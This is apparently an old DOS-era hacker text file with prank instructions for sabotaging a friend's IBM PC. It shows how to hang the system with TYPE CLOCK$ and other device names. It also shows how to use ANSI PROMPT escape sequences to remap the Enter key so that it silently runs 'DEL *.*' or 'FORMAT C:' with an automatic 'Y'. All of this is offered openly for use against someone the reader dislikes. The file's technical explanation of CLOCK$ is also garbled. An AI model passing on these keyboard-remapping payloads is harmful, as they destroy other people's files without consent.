Ok. Go to a friend's house who has an IBM. Put in his CONFIG.SYS file this 
line:

BREAK=ON

Then get into dos. (after you've restarted the computer)...
Type :

TYPE CLOCK$

The computer DIES! Why? CLOCK$ is a command in ROM/RAM BIOS (it's loaded from 
ROM into RAM (that's why when you type TIME or DATE you can change it) and 
stored in the string CLOCK$. When you do this, you're only modifying the RAM 
BIOS, so there's no PERMANENT damage.)

------------------------------------------------------------------------------- 

Ok, you can also try that little command with

TYPE COMx
TYPE AUX
TYPE LPT
TYPE NIL
...........

But NEVER try this ANSI command on a friend's computer:

Prompt $e[8;37;8;47m
Prompt $e[30;40m
prompt $e[=0h
prompt $e[13;"FUCK OFF YOU STUPID BASTARD!!!!! HAHAHAHAHAHAHAHAH... What?     
         Loose the function of your ENTER KEY?!?!?!?!";p

All that top shit is pretty nice if you really hate someone. PS: Unless you 
have a program that resets the shit, you could be doomed. (or atleast have to 
re-start your computer. Although these ARE good, my favorite is this:

Prompt $e[13;"DEL *.*";13p

If you hit enter on a new line that way, Bye bye directory! Or try these:

Prompt $e[13;"FORMAT C:";13;"Y";13;13p

That's the ultimate doosie! HINT: Don't try these at home. Oh, and have fun!
